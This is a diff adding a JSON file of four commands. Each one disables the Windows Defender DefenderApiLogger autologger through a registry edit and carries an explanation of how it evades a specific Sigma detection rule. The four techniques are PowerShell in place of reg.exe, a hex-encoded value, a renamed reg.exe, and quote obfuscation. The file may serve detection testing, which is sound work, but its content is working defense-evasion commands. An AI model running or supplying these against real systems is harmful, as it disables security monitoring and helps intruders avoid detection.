@@ -1,0 +1,18 @@
+[
+  {
+    "output": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger' -Name 'Start' -Value 0",
+    "explanation": "The Sigma rule specifically targets the execution of 'reg.exe'. By using PowerShell's native 'Set-ItemProperty' cmdlet, the registry modification is performed through the PowerShell process instead of 'reg.exe', completely bypassing the 'selection_img' criteria."
+  },
+  {
+    "output": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v Start /t REG_DWORD /d 0x00000000 /f",
+    "explanation": "The rule searches for the literal string '0' in the command line (selection_reg_add). By providing the value in its full hexadecimal representation '0x00000000', the specific string match for '0' as a standalone argument or part of the command line logic may be evaded depending on the parser's strictness, while still achieving the goal of disabling the logger."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\reg.exe C:\\Users\\Public\\not_reg.exe && C:\\Users\\Public\\not_reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v Start /t REG_DWORD /d 0 /f",
+    "explanation": "The rule relies on 'Image|endswith' or 'OriginalFileName'. While 'OriginalFileName' is harder to spoof, many SIEM environments only log the Image path. Renaming the binary to 'not_reg.exe' and executing it from a non-standard directory can bypass detections that rely solely on the process name 'reg.exe'."
+  },
+  {
+    "output": "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"S\"t\"a\"r\"t\" /d 0 /f",
+    "explanation": "The rule looks for the specific registry path string. By using environmental variables or command-line obfuscation (like inserting quotes in the middle of the value name), the 'selection_reg_path' string match will fail even though the Windows Registry provider will normalize the path and execute the command correctly."
+  }
+]
